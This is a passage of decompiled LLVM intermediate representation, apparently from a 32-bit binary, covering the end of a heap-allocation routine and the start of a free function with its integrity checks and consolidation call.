  %v1_8053ec2 = add i32 %v2_8053ec0, 8
  %v2_8053ec2 = inttoptr i32 %v1_8053ec2 to i32*
  %v3_8053ec2 = load i32, i32* %v2_8053ec2, align 4
  store i32 %v3_8053ec2, i32* @esi, align 4
  %v1_8053ec5 = add i32 %v2_8053ec0, 12
  %v2_8053ec5 = inttoptr i32 %v1_8053ec5 to i32*
  %v3_8053ec5 = load i32, i32* %v2_8053ec5, align 4
  store i32 %v3_8053ec5, i32* %edx.global-to-local, align 4
  %v1_8053ec8 = add i32 %v3_8053ec2, 12
  %v2_8053ec8 = inttoptr i32 %v1_8053ec8 to i32*
  %v3_8053ec8 = load i32, i32* %v2_8053ec8, align 4
  store i32 %v3_8053ec8, i32* @ecx, align 4
  %v12_8053ecb = icmp eq i32 %v3_8053ec8, %v2_8053ec0
  %v1_8053ecd = icmp eq i1 %v12_8053ecb, false
  br i1 %v1_8053ecd, label %dec_label_pc_8053f0c, label %dec_label_pc_8053ecf

dec_label_pc_8053ecf:                             ; preds = %dec_label_pc_8053ebc
  %v1_8053ecf = add i32 %v3_8053ec5, 8
  %v2_8053ecf = inttoptr i32 %v1_8053ecf to i32*
  %v3_8053ecf = load i32, i32* %v2_8053ecf, align 4
  %v15_8053ecf = icmp eq i32 %v3_8053ecf, %v3_8053ec8
  %v1_8053ed2 = icmp eq i1 %v15_8053ecf, false
  br i1 %v1_8053ed2, label %dec_label_pc_8053f0c, label %dec_label_pc_8053ed4

dec_label_pc_8053ed4:                             ; preds = %dec_label_pc_8053ecf
  %v2_8053ed4 = add i32 %v2_8053ebc, %v1_8053eab
  store i32 %v2_8053ed4, i32* @edi, align 4
  store i32 %v3_8053ec5, i32* %v2_8053ec8, align 4
  %v0_8053ed9 = load i32, i32* @esi, align 4
  %v1_8053ed9 = load i32, i32* %edx.global-to-local, align 4
  %v2_8053ed9 = add i32 %v1_8053ed9, 8
  %v3_8053ed9 = inttoptr i32 %v2_8053ed9 to i32*
  store i32 %v0_8053ed9, i32* %v3_8053ed9, align 4
  %v0_8053ee7.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053edc

dec_label_pc_8053edc:                             ; preds = %dec_label_pc_8053e9f, %dec_label_pc_8053ed4
  %v1_8053ef0 = phi i32 [ %v2_8053eb0, %dec_label_pc_8053e9f ], [ %v0_8053ee7.pre, %dec_label_pc_8053ed4 ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_8053ee4 = and i32 %v3_8053eb3, -4
  store i32 %v1_8053ee4, i32* %ebp.global-to-local, align 4
  %v4_8053ee7 = load i32, i32* %v3_8053f4a, align 4
  %v15_8053ee7 = icmp eq i32 %v1_8053ef0, %v4_8053ee7
  br i1 %v15_8053ee7, label %dec_label_pc_8053f3d, label %dec_label_pc_8053eec

dec_label_pc_8053eec:                             ; preds = %dec_label_pc_8053edc
  %v2_8053eec = add i32 %v1_8053ef0, 4
  %v3_8053eec = add i32 %v2_8053eec, %v1_8053ee4
  %v4_8053eec = inttoptr i32 %v3_8053eec to i32*
  %v5_8053eec = load i32, i32* %v4_8053eec, align 4
  store i32 %v5_8053eec, i32* %eax.global-to-local, align 4
  %v3_8053ef0 = inttoptr i32 %v2_8053eec to i32*
  store i32 %v1_8053ee4, i32* %v3_8053ef0, align 4
  %v0_8053ef3 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053ef3 = urem i32 %v0_8053ef3, 2
  %v2_8053ef3 = icmp eq i32 %v1_8053ef3, 0
  store i32 %v1_8053ef3, i32* %eax.global-to-local, align 4
  %v1_8053ef8 = icmp eq i1 %v2_8053ef3, false
  br i1 %v1_8053ef8, label %dec_label_pc_8053f19, label %dec_label_pc_8053efa

dec_label_pc_8053efa:                             ; preds = %dec_label_pc_8053eec
  %v0_8053efa = load i32, i32* @ebx, align 4
  %v1_8053efa = add i32 %v0_8053efa, 8
  %v2_8053efa = inttoptr i32 %v1_8053efa to i32*
  %v3_8053efa = load i32, i32* %v2_8053efa, align 4
  store i32 %v3_8053efa, i32* @edx, align 4
  %v1_8053efd = add i32 %v0_8053efa, 12
  %v2_8053efd = inttoptr i32 %v1_8053efd to i32*
  %v3_8053efd = load i32, i32* %v2_8053efd, align 4
  store i32 %v3_8053efd, i32* %eax.global-to-local, align 4
  %v1_8053f00 = add i32 %v3_8053efa, 12
  %v2_8053f00 = inttoptr i32 %v1_8053f00 to i32*
  %v3_8053f00 = load i32, i32* %v2_8053f00, align 4
  store i32 %v3_8053f00, i32* @esi, align 4
  %v12_8053f03 = icmp eq i32 %v3_8053f00, %v0_8053efa
  %v1_8053f05 = icmp eq i1 %v12_8053f03, false
  br i1 %v1_8053f05, label %dec_label_pc_8053f0c, label %dec_label_pc_8053f07

dec_label_pc_8053f07:                             ; preds = %dec_label_pc_8053efa
  %v1_8053f07 = add i32 %v3_8053efd, 8
  %v2_8053f07 = inttoptr i32 %v1_8053f07 to i32*
  %v3_8053f07 = load i32, i32* %v2_8053f07, align 4
  %v15_8053f07 = icmp eq i32 %v3_8053f07, %v3_8053f00
  br i1 %v15_8053f07, label %dec_label_pc_8053f11, label %dec_label_pc_8053f0c

dec_label_pc_8053f0c:                             ; preds = %dec_label_pc_8053f07, %dec_label_pc_8053efa, %dec_label_pc_8053ecf, %dec_label_pc_8053ebc
  %v0_8053f0c = call i32 @abort()
  store i32 %v0_8053f0c, i32* %eax.global-to-local, align 4
  %v1_8053f13.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053f11

dec_label_pc_8053f11:                             ; preds = %dec_label_pc_8053f07, %dec_label_pc_8053f0c
  %v1_8053f13 = phi i32 [ %v3_8053efa, %dec_label_pc_8053f07 ], [ %v1_8053f13.pre, %dec_label_pc_8053f0c ]
  %v0_8053f13 = phi i32 [ %v3_8053efd, %dec_label_pc_8053f07 ], [ %v0_8053f0c, %dec_label_pc_8053f0c ]
  %v0_8053f11 = load i32, i32* @edi, align 4
  %v1_8053f11 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053f11 = add i32 %v1_8053f11, %v0_8053f11
  store i32 %v2_8053f11, i32* @edi, align 4
  %v2_8053f13 = add i32 %v1_8053f13, 12
  %v3_8053f13 = inttoptr i32 %v2_8053f13 to i32*
  store i32 %v0_8053f13, i32* %v3_8053f13, align 4
  %v0_8053f16 = load i32, i32* @edx, align 4
  %v1_8053f16 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053f16 = add i32 %v1_8053f16, 8
  %v3_8053f16 = inttoptr i32 %v2_8053f16 to i32*
  store i32 %v0_8053f16, i32* %v3_8053f16, align 4
  br label %dec_label_pc_8053f19

dec_label_pc_8053f19:                             ; preds = %dec_label_pc_8053eec, %dec_label_pc_8053f11
  store i32 %v1_8053e64, i32* %eax.global-to-local, align 4
  %v3_8053f1d = load i32, i32* %v2_8053f1d, align 4
  store i32 %v3_8053f1d, i32* @edx, align 4
  %v0_8053f20 = load i32, i32* @ecx, align 4
  store i32 %v0_8053f20, i32* %v2_8053f1d, align 4
  %v0_8053f23 = load i32, i32* @edi, align 4
  %v1_8053f25 = or i32 %v0_8053f23, 1
  %v1_8053f28 = load i32, i32* @ecx, align 4
  %v2_8053f28 = add i32 %v1_8053f28, 4
  %v3_8053f28 = inttoptr i32 %v2_8053f28 to i32*
  store i32 %v1_8053f25, i32* %v3_8053f28, align 4
  %v0_8053f2b = load i32, i32* @ecx, align 4
  %v1_8053f2b = load i32, i32* @edx, align 4
  %v2_8053f2b = add i32 %v1_8053f2b, 12
  %v3_8053f2b = inttoptr i32 %v2_8053f2b to i32*
  store i32 %v0_8053f2b, i32* %v3_8053f2b, align 4
  store i32 %v1_8053e64, i32* %eax.global-to-local, align 4
  %v0_8053f32 = load i32, i32* @edx, align 4
  %v1_8053f32 = load i32, i32* @ecx, align 4
  %v2_8053f32 = add i32 %v1_8053f32, 8
  %v3_8053f32 = inttoptr i32 %v2_8053f32 to i32*
  store i32 %v0_8053f32, i32* %v3_8053f32, align 4
  %v0_8053f35 = load i32, i32* @edi, align 4
  %v1_8053f35 = load i32, i32* @ecx, align 4
  %v3_8053f35 = add i32 %v1_8053f35, %v0_8053f35
  %v4_8053f35 = inttoptr i32 %v3_8053f35 to i32*
  store i32 %v0_8053f35, i32* %v4_8053f35, align 4
  %v0_8053f38 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053f38 = load i32, i32* @ecx, align 4
  %v2_8053f38 = add i32 %v1_8053f38, 12
  %v3_8053f38 = inttoptr i32 %v2_8053f38 to i32*
  store i32 %v0_8053f38, i32* %v3_8053f38, align 4
  br label %dec_label_pc_8053f4d

dec_label_pc_8053f3d:                             ; preds = %dec_label_pc_8053edc
  %v0_8053f3d = load i32, i32* @edi, align 4
  %v2_8053f3d = add i32 %v0_8053f3d, %v1_8053ee4
  %v1_8053f40 = or i32 %v2_8053f3d, 1
  store i32 %v1_8053f40, i32* %eax.global-to-local, align 4
  %v1_8053f43 = load i32, i32* @ecx, align 4
  %v2_8053f43 = add i32 %v1_8053f43, 4
  %v3_8053f43 = inttoptr i32 %v2_8053f43 to i32*
  store i32 %v1_8053f40, i32* %v3_8053f43, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v0_8053f4a = load i32, i32* @ecx, align 4
  store i32 %v0_8053f4a, i32* %v3_8053f4a, align 4
  br label %dec_label_pc_8053f4d

dec_label_pc_8053f4d:                             ; preds = %dec_label_pc_8053f19, %dec_label_pc_8053f3d
  store i32 %v3_8053e9f, i32* @ecx, align 4
  %v1_8053f51 = icmp eq i32 %v3_8053e9f, 0
  %v1_8053f53 = icmp eq i1 %v1_8053f51, false
  br i1 %v1_8053f53, label %dec_label_pc_8053e9f, label %dec_label_pc_8053f59

dec_label_pc_8053f59:                             ; preds = %dec_label_pc_8053f4d, %dec_label_pc_8053e8b
  store i32 %v4_8053e83, i32* @ecx, align 4
  %v15_8053f5d = icmp eq i32 %v0_8053e99, %v4_8053e83
  br i1 %v15_8053f5d, label %dec_label_pc_8053fe1, label %dec_label_pc_8053f63

dec_label_pc_8053f63:                             ; preds = %dec_label_pc_8053f59
  %v4_8053f63 = add i32 %v0_8053e99, 4
  br label %dec_label_pc_8053e8b

dec_label_pc_8053f6d:                             ; preds = %dec_label_pc_8053f7c.preheader, %dec_label_pc_8053f6d
  %v1_8053f7120 = phi i32 [ 1, %dec_label_pc_8053f7c.preheader ], [ %v0_8053f7c.pre, %dec_label_pc_8053f6d ]
  %v2_8053f71 = mul i32 %v1_8053f7120, 8
  %v4_8053f71 = add i32 %v3_8053f71, %v2_8053f71
  store i32 %v4_8053f71, i32* %eax.global-to-local, align 4
  %v1_8053f75 = add i32 %v1_8053f7120, 1
  store i32 %v1_8053f75, i32* %edx.global-to-local, align 4
  %v2_8053f76 = add i32 %v4_8053f71, 12
  %v3_8053f76 = inttoptr i32 %v2_8053f76 to i32*
  store i32 %v4_8053f71, i32* %v3_8053f76, align 4
  %v0_8053f79 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053f79 = add i32 %v0_8053f79, 8
  %v3_8053f79 = inttoptr i32 %v2_8053f79 to i32*
  store i32 %v0_8053f79, i32* %v3_8053f79, align 4
  %v0_8053f7c.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_8053f7f = icmp sgt i32 %v0_8053f7c.pre, 95
  br i1 %v7_8053f7f, label %dec_label_pc_8053f81, label %dec_label_pc_8053f6d

dec_label_pc_8053f81:                             ; preds = %dec_label_pc_8053f6d
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_8053f85 = add i32 %tmp11, 864
  %v2_8053f85 = inttoptr i32 %v1_8053f85 to i32*
  %v3_8053f85 = load i32, i32* %v2_8053f85, align 4
  %v4_8053f85 = or i32 %v3_8053f85, 1
  store i32 %v4_8053f85, i32* %v2_8053f85, align 4
  %v0_8053f8c = load i32, i32* %eax.global-to-local, align 4
  %v1_8053f8c = add i32 %v0_8053f8c, 840
  %v2_8053f8c = inttoptr i32 %v1_8053f8c to i32*
  store i32 0, i32* %v2_8053f8c, align 4
  %v0_8053f96 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053f96 = add i32 %v0_8053f96, 852
  %v2_8053f96 = inttoptr i32 %v1_8053f96 to i32*
  store i32 65536, i32* %v2_8053f96, align 4
  %v0_8053fa0 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053fa0 = add i32 %v0_8053fa0, 844
  %v2_8053fa0 = inttoptr i32 %v1_8053fa0 to i32*
  store i32 262144, i32* %v2_8053fa0, align 4
  %v0_8053faa = load i32, i32* %eax.global-to-local, align 4
  %v1_8053faa = add i32 %v0_8053faa, 836
  %v2_8053faa = inttoptr i32 %v1_8053faa to i32*
  store i32 262144, i32* %v2_8053faa, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v2_8053fbb = load i32, i32* %arg1, align 4
  %v1_8053fbd = urem i32 %v2_8053fbb, 4
  %v1_8053fc0 = or i32 %v1_8053fbd, 72
  store i32 %v1_8053fc0, i32* %arg1, align 4
  %v0_8053fc5 = load i32, i32* @edx, align 4
  %v1_8053fc7 = add i32 %v0_8053fc5, 52
  store i32 %v1_8053fc7, i32* %eax.global-to-local, align 4
  %v2_8053fca = add i32 %v0_8053fc5, 44
  %v3_8053fca = inttoptr i32 %v2_8053fca to i32*
  store i32 %v1_8053fc7, i32* %v3_8053fca, align 4
  %v1_8053fcf = call i32 @sysconf(i32 30)
  store i32 %v1_8053fcf, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_8053fdb = add i32 %tmp11, 860
  %v3_8053fdb = inttoptr i32 %v2_8053fdb to i32*
  store i32 %v1_8053fcf, i32* %v3_8053fdb, align 4
  br label %dec_label_pc_8053fe1

dec_label_pc_8053fe1:                             ; preds = %dec_label_pc_8053f59, %dec_label_pc_8053f81
  store i32 %v0_8053e44, i32* @ebx, align 4
  store i32 %v0_8053e43, i32* @esi, align 4
  store i32 %v0_8053e42, i32* @edi, align 4
  %v0_8053fe8 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8053fe8

; uselistorder directives
  uselistorder i32 %v0_8053f79, { 1, 0 }
  uselistorder i32 %v0_8053f35, { 1, 0 }
  uselistorder i32 %v1_8053ef3, { 1, 0 }
  uselistorder i32 %v2_8053eec, { 1, 0 }
  uselistorder i32 %v1_8053ee4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8053ef0, { 1, 0 }
  uselistorder i32 %v3_8053e9f, { 2, 1, 3, 0 }
  uselistorder i32 %v0_8053ebc, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8053e99, { 1, 0, 3, 2 }
  uselistorder i32* %v3_8053f4a, { 1, 0 }
  uselistorder i32 %tmp11, { 3, 14, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 22, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 17, 18, 19, 20, 21, 23, 24, 25, 26 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_8053fe1, { 1, 0 }
  uselistorder label %dec_label_pc_8053f6d, { 1, 0 }
  uselistorder label %dec_label_pc_8053f4d, { 1, 0 }
  uselistorder label %dec_label_pc_8053f19, { 1, 0 }
  uselistorder label %dec_label_pc_8053f11, { 1, 0 }
  uselistorder label %dec_label_pc_8053edc, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8053fe9 = load i32, i32* @ebp, align 4
  %v0_8053fea = load i32, i32* @edi, align 4
  %v0_8053feb = load i32, i32* @esi, align 4
  %v0_8053fec = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8053ff4 = icmp eq i32 %arg1, 0
  br i1 %v1_8053ff4, label %dec_label_pc_805417d, label %dec_label_pc_8053ffc

dec_label_pc_8053ffc:                             ; preds = %entry
  %v2_8054007 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8054007, i32* @eax, align 4
  %v2_805400c = call i32 @__pthread_return_void(i32 %v2_8054007, i32 134565087)
  store i32 %v2_805400c, i32* %eax.global-to-local, align 4
  %v1_8054018 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b3f0.493 to i32))
  %v1_805401d = add i32 %arg1, -8
  store i32 %v1_805401d, i32* @ecx, align 4
  %v0_8054020 = load i8, i8* @global_var_8061860.494, align 1
  %v1_8054020 = sext i8 %v0_8054020 to i32
  store i32 %v1_8054020, i32* %eax.global-to-local, align 4
  %v1_8054025 = add i32 %arg1, -4
  %v2_8054025 = inttoptr i32 %v1_8054025 to i32*
  %v3_8054025 = load i32, i32* %v2_8054025, align 4
  store i32 %v3_8054025, i32* @edx, align 4
  %v1_805402d = and i32 %v3_8054025, -4
  %v4_805402d = trunc i32 %v1_805402d to i8
  store i32 %v1_805402d, i32* @ebx, align 4
  %v8_8054032 = icmp ugt i8 %v4_805402d, %v0_8054020
  br i1 %v8_8054032, label %dec_label_pc_8054054, label %dec_label_pc_8054034

dec_label_pc_8054034:                             ; preds = %dec_label_pc_8053ffc
  %v1_8054034 = or i32 %v1_8054020, 3
  %v3_8054034 = trunc i32 %v1_8054034 to i8
  store i32 %v1_8054034, i32* %eax.global-to-local, align 4
  %v2_8054037 = udiv i32 %v3_8054025, 8
  store i8 %v3_8054034, i8* @global_var_8061860.494, align 32
  %v1_805403f = mul nuw i32 %v2_8054037, 4
  %v2_805403f = add i32 %v1_805403f, ptrtoint (i8* @global_var_8061860.494 to i32)
  store i32 %v2_805403f, i32* @edx, align 4
  %v1_8054046 = add i32 %v1_805403f, add (i32 ptrtoint (i8* @global_var_8061860.494 to i32), i32 -4)
  %v2_8054046 = inttoptr i32 %v1_8054046 to i32*
  %v3_8054046 = load i32, i32* %v2_8054046, align 4
  store i32 %v3_8054046, i32* %eax.global-to-local, align 4
  %v3_8054049 = inttoptr i32 %arg1 to i32*
  store i32 %v3_8054046, i32* %v3_8054049, align 4
  %v0_805404c = load i32, i32* @ecx, align 4
  %v1_805404c = load i32, i32* @edx, align 4
  %v2_805404c = add i32 %v1_805404c, -4
  %v3_805404c = inttoptr i32 %v2_805404c to i32*
  store i32 %v0_805404c, i32* %v3_805404c, align 4
  br label %dec_label_pc_805416c

dec_label_pc_8054054:                             ; preds = %dec_label_pc_8053ffc
  %v2_8054054 = and i32 %v3_8054025, 2
  %v3_8054054 = icmp eq i32 %v2_8054054, 0
  %v1_8054057 = icmp eq i1 %v3_8054054, false
  br i1 %v1_8054057, label %dec_label_pc_805414c, label %dec_label_pc_805405d

dec_label_pc_805405d:                             ; preds = %dec_label_pc_8054054
  %v1_805405d = or i32 %v1_8054020, 1
  %v3_805405d = trunc i32 %v1_805405d to i8
  store i32 %v1_805405d, i32* %eax.global-to-local, align 4
  store i8 %v3_805405d, i8* @global_var_8061860.494, align 32
  %v2_8054065 = add i32 %v1_805402d, %v1_805401d
  store i32 %v2_8054065, i32* @esi, align 4
  %v1_8054068 = add i32 %v2_8054065, 4
  %v2_8054068 = inttoptr i32 %v1_8054068 to i32*
  %v3_8054068 = load i32, i32* %v2_8054068, align 4
  store i32 %v3_8054068, i32* %eax.global-to-local, align 4
  %v2_805406f = inttoptr i32 %v1_8054025 to i8*
  %v3_805406f = load i8, i8* %v2_805406f, align 1
  %v4_805406f = urem i8 %v3_805406f, 2
  %v5_805406f = icmp eq i8 %v4_805406f, 0
  %v1_8054073 = icmp eq i1 %v5_805406f, false
  br i1 %v1_8054073, label %dec_label_pc_8054096, label %dec_label_pc_8054075

dec_label_pc_8054075:                             ; preds = %dec_label_pc_805405d
  %v2_8054075 = inttoptr i32 %v1_805401d to i32*
  %v3_8054075 = load i32, i32* %v2_8054075, align 4
  store i32 %v3_8054075, i32* @ebp, align 4
  %v2_805407a = sub i32 %v1_805401d, %v3_8054075
  store i32 %v2_805407a, i32* %eax.global-to-local, align 4
  %v1_805407c = add i32 %v2_805407a, 8
  %v2_805407c = inttoptr i32 %v1_805407c to i32*
  %v3_805407c = load i32, i32* %v2_805407c, align 4
  store i32 %v3_805407c, i32* @edi, align 4
  %v1_805407f = add i32 %v2_805407a, 12
  %v2_805407f = inttoptr i32 %v1_805407f to i32*
  %v3_805407f = load i32, i32* %v2_805407f, align 4
  store i32 %v3_805407f, i32* @edx, align 4
  %v1_8054082 = add i32 %v3_805407c, 12
  %v2_8054082 = inttoptr i32 %v1_8054082 to i32*
  %v3_8054082 = load i32, i32* %v2_8054082, align 4
  store i32 %v3_8054082, i32* @ecx, align 4
  %v12_8054085 = icmp eq i32 %v3_8054082, %v2_805407a
  %v1_8054087 = icmp eq i1 %v12_8054085, false
  br i1 %v1_8054087, label %dec_label_pc_80540c5, label %dec_label_pc_8054089

dec_label_pc_8054089:                             ; preds = %dec_label_pc_8054075
  %v1_8054089 = add i32 %v3_805407f, 8
  %v2_8054089 = inttoptr i32 %v1_8054089 to i32*
  %v3_8054089 = load i32, i32* %v2_8054089, align 4
  %v15_8054089 = icmp eq i32 %v3_8054089, %v3_8054082
  %v1_805408c = icmp eq i1 %v15_8054089, false
  br i1 %v1_805408c, label %dec_label_pc_80540c5, label %dec_label_pc_805408e

dec_label_pc_805408e:                             ; preds = %dec_label_pc_8054089
  %v2_805408e = add i32 %v3_8054075, %v1_805402d
  store i32 %v2_805408e, i32* @ebx, align 4
  store i32 %v3_805407f, i32* %v2_8054082, align 4
  %v0_8054093 = load i32, i32* @edi, align 4
  %v1_8054093 = load i32, i32* @edx, align 4
  %v2_8054093 = add i32 %v1_8054093, 8
  %v3_8054093 = inttoptr i32 %v2_8054093 to i32*
  store i32 %v0_8054093, i32* %v3_8054093, align 4
  %v0_805409d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8054096

dec_label_pc_8054096:                             ; preds = %dec_label_pc_805405d, %dec_label_pc_805408e
  %v1_80540a9 = phi i32 [ %v2_8054065, %dec_label_pc_805405d ], [ %v0_805409d.pre, %dec_label_pc_805408e ]
  %v1_805409a = and i32 %v3_8054068, -4
  store i32 %v1_805409a, i32* @ebp, align 4
  %v1_805409d = load i32, i32* @global_var_806188c.495, align 4
  %v12_805409d = icmp eq i32 %v1_80540a9, %v1_805409d
  br i1 %v12_805409d, label %dec_label_pc_80540f7, label %dec_label_pc_80540a5

dec_label_pc_80540a5:                             ; preds = %dec_label_pc_8054096
  %v2_80540a5 = add i32 %v1_80540a9, 4
  %v3_80540a5 = add i32 %v2_80540a5, %v1_805409a
  %v4_80540a5 = inttoptr i32 %v3_80540a5 to i32*
  %v5_80540a5 = load i32, i32* %v4_80540a5, align 4
  store i32 %v5_80540a5, i32* %eax.global-to-local, align 4
  %v3_80540a9 = inttoptr i32 %v2_80540a5 to i32*
  store i32 %v1_805409a, i32* %v3_80540a9, align 4
  %v0_80540ac = load i32, i32* %eax.global-to-local, align 4
  %v1_80540ac = urem i32 %v0_80540ac, 2
  %v2_80540ac = icmp eq i32 %v1_80540ac, 0
  store i32 %v1_80540ac, i32* %eax.global-to-local, align 4
  %v1_80540b1 = icmp eq i1 %v2_80540ac, false
  br i1 %v1_80540b1, label %dec_label_pc_80540d2, label %dec_label_pc_80540b3

dec_label_pc_80540b3:                             ; preds = %dec_label_pc_80540a5
  %v0_80540b3 = load i32, i32* @esi, align 4
  %v1_80540b3 = add i32 %v0_80540b3, 8
  %v2_80540b3 = inttoptr i32 %v1_80540b3 to i32*
  %v3_80540b3 = load i32, i32* %v2_80540b3, align 4
  store i32 %v3_80540b3, i32* @edx, align 4
  %v1_80540b6 = add i32 %v0_80540b3, 12
  %v2_80540b6 = inttoptr i32 %v1_80540b6 to i32*
  %v3_80540b6 = load i32, i32* %v2_80540b6, align 4
  store i32 %v3_80540b6, i32* %eax.global-to-local, align 4
  %v1_80540b9 = add i32 %v3_80540b3, 12
  %v2_80540b9 = inttoptr i32 %v1_80540b9 to i32*
  %v3_80540b9 = load i32, i32* %v2_80540b9, align 4
  store i32 %v3_80540b9, i32* @edi, align 4
  %v12_80540bc = icmp eq i32 %v3_80540b9, %v0_80540b3
  %v1_80540be = icmp eq i1 %v12_80540bc, false
  br i1 %v1_80540be, label %dec_label_pc_80540c5, label %dec_label_pc_80540c0

dec_label_pc_80540c0:                             ; preds = %dec_label_pc_80540b3
  %v1_80540c0 = add i32 %v3_80540b6, 8
  %v2_80540c0 = inttoptr i32 %v1_80540c0 to i32*
  %v3_80540c0 = load i32, i32* %v2_80540c0, align 4
  %v15_80540c0 = icmp eq i32 %v3_80540c0, %v3_80540b9
  br i1 %v15_80540c0, label %dec_label_pc_80540ca, label %dec_label_pc_80540c5

dec_label_pc_80540c5:                             ; preds = %dec_label_pc_80540c0, %dec_label_pc_80540b3, %dec_label_pc_8054089, %dec_label_pc_8054075
  %v0_80540c5 = call i32 @abort()
  store i32 %v0_80540c5, i32* %eax.global-to-local, align 4
  %v1_80540ca.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80540ca

dec_label_pc_80540ca:                             ; preds = %dec_label_pc_80540c0, %dec_label_pc_80540c5
  %v1_80540ca = phi i32 [ %v3_80540b3, %dec_label_pc_80540c0 ], [ %v1_80540ca.pre, %dec_label_pc_80540c5 ]
  %v0_80540ca = phi i32 [ %v3_80540b6, %dec_label_pc_80540c0 ], [ %v0_80540c5, %dec_label_pc_80540c5 ]
  %v2_80540ca = add i32 %v1_80540ca, 12
  %v3_80540ca = inttoptr i32 %v2_80540ca to i32*
  store i32 %v0_80540ca, i32* %v3_80540ca, align 4
  %v0_80540cd = load i32, i32* @ebx, align 4
  %v1_80540cd = load i32, i32* @ebp, align 4
  %v2_80540cd = add i32 %v1_80540cd, %v0_80540cd
  store i32 %v2_80540cd, i32* @ebx, align 4
  %v0_80540cf = load i32, i32* @edx, align 4
  %v1_80540cf = load i32, i32* %eax.global-to-local, align 4
  %v2_80540cf = add i32 %v1_80540cf, 8
  %v3_80540cf = inttoptr i32 %v2_80540cf to i32*
  store i32 %v0_80540cf, i32* %v3_80540cf, align 4
  br label %dec_label_pc_80540d2

dec_label_pc_80540d2:                             ; preds = %dec_label_pc_80540a5, %dec_label_pc_80540ca
  %v0_80540d2 = load i32, i32* @global_var_806189c.513, align 4
  store i32 %v0_80540d2, i32* %eax.global-to-local, align 4
  %v0_80540d7 = load i32, i32* @ecx, align 4
  %v1_80540d7 = add i32 %v0_80540d7, 12
  %v2_80540d7 = inttoptr i32 %v1_80540d7 to i32*
  store i32 ptrtoint (i32* @global_var_8061894.497 to i32), i32* %v2_80540d7, align 4
  %v0_80540de = load i32, i32* @ebx, align 4
  %v1_80540de = load i32, i32* @ecx, align 4
  %v3_80540de = add i32 %v1_80540de, %v0_80540de
  %v4_80540de = inttoptr i32 %v3_80540de to i32*
  store i32 %v0_80540de, i32* %v4_80540de, align 4
  %v0_80540e1 = load i32, i32* %eax.global-to-local, align 4
  %v1_80540e1 = load i32, i32* @ecx, align 4
  %v2_80540e1 = add i32 %v1_80540e1, 8
  %v3_80540e1 = inttoptr i32 %v2_80540e1 to i32*
  store i32 %v0_80540e1, i32* %v3_80540e1, align 4
  %v0_80540e4 = load i32, i32* @ecx, align 4
  %v1_80540e4 = load i32, i32* %eax.global-to-local, align 4
  %v2_80540e4 = add i32 %v1_80540e4, 12
  %v3_80540e4 = inttoptr i32 %v2_80540e4 to i32*
  store i32 %v0_80540e4, i32* %v3_80540e4, align 4
  %v0_80540e7 = load i32, i32* @ebx, align 4
  %v1_80540e9 = or i32 %v0_80540e7, 1
  store i32 %v1_80540e9, i32* %eax.global-to-local, align 4
  %v0_80540ec = load i32, i32* @ecx, align 4
  store i32 %v0_80540ec, i32* @global_var_806189c.513, align 4
  %v2_80540f2 = add i32 %v0_80540ec, 4
  %v3_80540f2 = inttoptr i32 %v2_80540f2 to i32*
  store i32 %v1_80540e9, i32* %v3_80540f2, align 4
  br label %dec_label_pc_8054107

dec_label_pc_80540f7:                             ; preds = %dec_label_pc_8054096
  %v0_80540f7 = load i32, i32* @ebx, align 4
  %v2_80540f7 = add i32 %v0_80540f7, %v1_805409a
  store i32 %v2_80540f7, i32* @ebx, align 4
  %v1_80540fb = or i32 %v2_80540f7, 1
  store i32 %v1_80540fb, i32* %eax.global-to-local, align 4
  %v1_80540fe = load i32, i32* @ecx, align 4
  %v2_80540fe = add i32 %v1_80540fe, 4
  %v3_80540fe = inttoptr i32 %v2_80540fe to i32*
  store i32 %v1_80540fb, i32* %v3_80540fe, align 4
  %v0_8054101 = load i32, i32* @ecx, align 4
  store i32 %v0_8054101, i32* @global_var_806188c.495, align 4
  br label %dec_label_pc_8054107

dec_label_pc_8054107:                             ; preds = %dec_label_pc_80540d2, %dec_label_pc_80540f7
  %v0_8054107 = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_8054107, 131072
  br i1 %tmp, label %dec_label_pc_805416c, label %dec_label_pc_805410f

dec_label_pc_805410f:                             ; preds = %dec_label_pc_8054107
  %v0_805410f = load i8, i8* @global_var_8061860.494, align 32
  %v1_805410f = and i8 %v0_805410f, 2
  %v2_805410f = icmp eq i8 %v1_805410f, 0
  br i1 %v2_805410f, label %dec_label_pc_8054128, label %dec_label_pc_8054118

dec_label_pc_8054118:                             ; preds = %dec_label_pc_805410f
  %v2_8054120 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8061860.494 to i32*))
  store i32 %v2_8054120, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054128

dec_label_pc_8054128:                             ; preds = %dec_label_pc_805410f, %dec_label_pc_8054118
